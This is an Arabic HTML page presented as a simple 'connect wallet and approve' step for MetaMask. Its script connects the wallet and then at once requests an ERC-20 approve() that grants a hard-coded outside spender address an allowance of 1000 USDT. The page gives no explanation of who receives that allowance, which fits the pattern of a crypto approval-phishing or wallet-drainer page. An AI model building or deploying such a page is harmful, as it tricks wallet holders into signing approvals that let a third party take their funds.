<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <title>ربط المحفظة والموافقة</title>
  <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js" type="application/javascript"></script>
  <style>
    body {
      font-family: Tahoma, sans-serif;
      direction: rtl;
      text-align: center;
      background-color: #f5f5f5;
      padding: 50px;
    }
    #connectWallet {
      background-color: #ff9900;
      color: white;
      border: none;
      padding: 15px 30px;
      font-size: 18px;
      border-radius: 10px;
      cursor: pointer;
    }
    #connectWallet:hover {
      background-color: #e68a00;
    }
    #walletStatus {
      margin-top: 20px;
      font-size: 16px;
      color: #333;
    }
  </style>
</head>
<body>

  <h1>ربط المحفظة والموافقة</h1>
  <button id="connectWallet">اتصل بـ MetaMask</button>
  <p id="walletStatus">...</p>

  <script>
    const connectWalletBtn = document.getElementById('connectWallet');
    const walletStatus = document.getElementById('walletStatus');

    const networks = {
      ethereum: {
        chainId: 1,
        name: 'Ethereum',
        symbol: 'ETH',
        explorer: 'https://etherscan.io',
        rpc: 'https://cloudflare-eth.com',
      }
    };

    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);

    async function switchNetwork(networkKey) {
      const network = networks[networkKey];
      const hexChainId = '0x' + network.chainId.toString(16);
      try {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: hexChainId }],
        });
      } catch (switchError) {
        console.error('Switch network error:', switchError);
        walletStatus.textContent = 'فشل في التبديل للشبكة المطلوبة.';
      }
    }

    connectWalletBtn.addEventListener('click', async () => {
      if (typeof window.ethereum === 'undefined') {
        if (isMobile) {
          const redirectUrl = 'metamask://dapp/' + location.href.replace(/^https?:\/\//, '');
          walletStatus.textContent = 'جارٍ فتح MetaMask، ثم ارجع للصفحة واضغط الزر مرة أخرى.';
          window.location.href = redirectUrl;
        } else {
          walletStatus.textContent = 'يرجى تثبيت MetaMask على المتصفح.';
        }
        return;
      }

      const provider = new ethers.providers.Web3Provider(window.ethereum);

      try {
        await provider.send('eth_requestAccounts', []);
        const signer = provider.getSigner();
        const address = await signer.getAddress();
        const network = await provider.getNetwork();

        if (network.chainId !== networks.ethereum.chainId) {
          await switchNetwork('ethereum');
        }

        // بيانات التوكن والاسبندر
        const tokenAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // USDT
        const spender = '0xaB63dd850a8C2EDD526fF2D929187B94E03F777D';     // spender address
        // نوافق على 1000 USDT (يوجد 6 أصفار عشريّة في USDT)
        const amount = ethers.utils.parseUnits("1000", 6);

        const abi = [
          'function approve(address spender, uint256 amount) public returns (bool)'
        ];

        const tokenContract = new ethers.Contract(tokenAddress, abi, signer);

        walletStatus.textContent = 'جارٍ إرسال المعاملة...';

        const tx = await tokenContract.approve(spender, amount);
        await tx.wait();

        walletStatus.textContent = 'تمت الموافقة بنجاح ✅';
      } catch (error) {
        console.error(error);
        walletStatus.textContent = 'حدث خطأ أثناء عملية الموافقة ❌';
      }
    });
  </script>

</body>
</html>
